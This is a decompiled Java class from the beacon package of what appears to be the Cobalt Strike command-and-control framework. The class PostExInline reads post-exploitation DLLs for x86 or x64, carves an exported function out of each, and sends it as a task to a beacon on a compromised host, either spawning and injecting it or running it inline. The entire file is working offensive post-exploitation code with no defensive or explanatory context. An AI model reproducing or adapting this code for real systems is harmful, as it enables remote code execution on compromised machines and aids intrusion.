package beacon;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.BeaconEntry;
import common.CommonUtils;
import common.SleevedResource;
import pe.PEParser;

public abstract class PostExInline {
   protected AggressorClient client;

   public String arch(String var1) {
      BeaconEntry var2 = DataUtils.getBeacon(this.client.getData(), var1);
      return var2 != null ? var2.arch() : "x86";
   }

   public PostExInline(AggressorClient var1) {
      this.client = var1;
   }

   public String getFile(String var1) {
      if ("x86".equals(var1)) {
         return "resources/postex.dll";
      } else if ("x64".equals(var1)) {
         return "resources/postex.x64.dll";
      } else {
         throw new RuntimeException("unknown arch.");
      }
   }

   public byte[] getArguments() {
      return new byte[0];
   }

   public abstract String getFunction();

   public void spawnAndInject(String var1) {
      String var2 = this.arch(var1);
      CommandBuilder var3 = new CommandBuilder();
      if ("x64".equals(var2)) {
         var3.setCommand(97);
      } else {
         var3.setCommand(96);
      }

      String var4 = this.getFunction();
      if ("x86".equals(var2)) {
         var4 = "_" + var4 + "@4";
      }

      byte[] var5 = SleevedResource.readResource(this.getFile(var2));
      PEParser var6 = PEParser.load(var5);
      byte[] var7 = var6.carveExportedFunction(var4);
      var3.addLengthAndString(var7);
      var3.addLengthAndString(this.getArguments());
      this.client.getConnection().call("beacons.task", CommonUtils.args(var1, var3.build()));
   }

   public void go(String var1) {
      String var2 = this.arch(var1);
      CommandBuilder var3 = new CommandBuilder();
      var3.setCommand(95);
      String var4 = this.getFunction();
      if ("x86".equals(var2)) {
         var4 = "_" + var4 + "@4";
      }

      byte[] var5 = SleevedResource.readResource(this.getFile(var2));
      PEParser var6 = PEParser.load(var5);
      byte[] var7 = var6.carveExportedFunction(var4);
      var3.addLengthAndString(this.getArguments());
      var3.addString(var7);
      this.client.getConnection().call("beacons.task", CommonUtils.args(var1, var3.build()));
   }
}
